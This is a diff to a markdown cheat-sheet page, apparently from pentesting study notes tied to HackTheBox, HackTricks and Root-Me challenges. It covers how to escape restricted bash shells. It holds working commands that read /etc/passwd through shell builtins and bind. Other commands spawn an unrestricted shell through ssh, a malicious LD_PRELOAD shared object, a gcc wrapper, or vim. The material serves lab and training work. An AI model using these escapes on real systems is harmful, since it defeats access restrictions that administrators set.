@@ -2,10 +2,11 @@
 
 [![linuxprivilegeescalation](../../../../_badges/htb/linuxprivilegeescalation.svg)](https://academy.hackthebox.com/course/preview/linux-privilege-escalation)
 [![escaping_from_jails](../../../../_badges/hacktricks/escaping_from_jails.svg)](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash#bash-jails)
+[![bash_restricted_shells](../../../../_badges/rootme/app_script/bash_restricted_shells.svg)](https://www.root-me.org/en/Challenges/App-Script/Bash-Restricted-shells)
 
 <div class="row row-cols-lg-2"><div>
 
-A restricted shell such as `rbash` is a shell that restrict the action of the user to a limited list of commands/arguments. For instance, for rBASH:
+A restricted shell such as `rbash` is a shell that restrict the action of the user to a limited list of commands/arguments. For instance, for rbash:
 
 * we cannot use commands with pathnames containing a "/"
 * we can use `help` to list available commands
@@ -21,17 +22,16 @@ Common tricks:
 * **Read a file**: `read f < /etc/passwd; echo $f`
 * **Read a file**: `f=$(</etc/passwd); echo $f`
 
-If you can run commands, refer to [GTFOBins](../tools/gtfobins.md) or their manual. For VIM:
+Use `compgen -c`, `help`, or `<tab>` to list available commands.
 
-```ruby!
-:set shell=/bin/bash
-:shell
-```
+📚 Sometimes, `ssh [...] -t "/bin/bash --noprofile"` may work.
 </div></div>
 
 <hr class="sep-both">
 
 ## Restricted Bash (rbash)
+
+[![bash_restricted_shells](../../../../_badges/rootme/app_script/bash_restricted_shells.svg)](https://www.root-me.org/en/Challenges/App-Script/Bash-Restricted-shells)
 
 <div class="row row-cols-lg-2"><div>
 
@@ -78,5 +78,42 @@ Method using `bind`:
 
 ```shell!
 $ bind -f /etc/passwd
+```
+</div></div>
+
+<hr class="sep-both">
+
+## Special Scenarios
+
+<div class="row row-cols-lg-2"><div>
+
+#### LD_PRELOAD
+
+[![bash_restricted_shells](../../../../_badges/rootme/app_script/bash_restricted_shells.svg)](https://www.root-me.org/en/Challenges/App-Script/Bash-Restricted-shells)
+
+If we have access to a program that honor `LD_PRELOAD`, e.g. any command aside from the builtin functions, we may be able to pop a bash. For that to be possible, we need a malicious `.so`. 
+
+If `gcc` is available, we can easily compile one, while it's unlikely. 
+
+```shell!
+$ echo 'void _init() {' > /tmp/test.c
+$ echo 'system("/bin/bash");' >> /tmp/test.c
+$ echo '}' >> /tmp/test.c
+$ gcc -shared -fPIC /tmp/test.c -o /tmp/test.so -nostartfiles
+$ LD_PRELOAD='/tmp/test.so' gcc
+```
+
+➡️ If gcc is available, `gcc -wrapper /bin/bash,-s .` is faster.
+</div><div>
+
+#### VIM
+
+[![bash_restricted_shells](../../../../_badges/rootme/app_script/bash_restricted_shells.svg)](https://www.root-me.org/en/Challenges/App-Script/Bash-Restricted-shells)
+
+If you can run VIM, it's easy to escape:
+
+```ruby!
+:set shell=/bin/bash
+:shell
 ```
 </div></div>
